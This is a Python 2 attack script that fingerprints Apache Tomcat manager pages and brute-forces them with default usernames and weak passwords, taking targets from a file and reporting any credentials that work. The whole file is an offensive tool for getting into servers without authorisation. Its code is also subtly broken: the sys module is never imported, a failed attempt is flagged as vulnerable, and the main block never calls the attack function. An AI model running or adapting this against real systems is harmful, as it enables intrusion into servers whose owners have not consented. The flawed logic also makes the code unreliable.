
import requests as req
from multiprocessing import Pool


def _test(target):
    url = target + '/manager/html'
    _ = req.get(url).text
    filter_list = ['Apache Tomcat/7', 'Apache Tomcat/8', 'Apache Tomcat/9']
    for key in filter_list:
        if key in _:
            return (False, key)
    return (True, 'Apache Tomcat/6')

def run(target):
    unames = ['tomcat', 'admin', 'role1']
    pwd_list = ['123456', '12345', 'tomcat', 'tomcat123']
    result = {'vulnerable': False}
    url = target + '/manager/html'
    vulnerable, tomcat_ver = _test(target)
    if not vulnerable:
        result['tips'] = '%s tomcat ver:%s cannot brute' % (target, tomcat_ver)
        print result
        return
    for uname in unames:
        for pwd in pwd_list:
            try:
                _ = req.get(url, auth=(uname, pwd))
            except Exception as e:
                result['tips'] = '%s try uname and pwd except: %s' % (target, e)
                print result
                return

            if _.status_code == 200:
                result['vulnerable'] = True
                result['URL'] = url
                result['Username'] = uname
                result['Password'] = pwd
                print result
                return
            if _.status_code == 404:
                result['tips'] = "%s isn't exist" % url
                print result
                return


    result['vulnerable'] = True
    result['tips'] = '%s all uname and pwd have tried,but failed!' % target
    print result
    return


if __name__ == '__main__':

    urls = []
    for line in open(sys.argv[1]):
        line = line.strip('\n')
        urls.append(line)
        print line
    # urls = ['http://10.223.2.60:9090']
    #print urls
    # pool = Pool(20)
    # pool.map(run, urls)
    # pool.close()
    # pool.join()
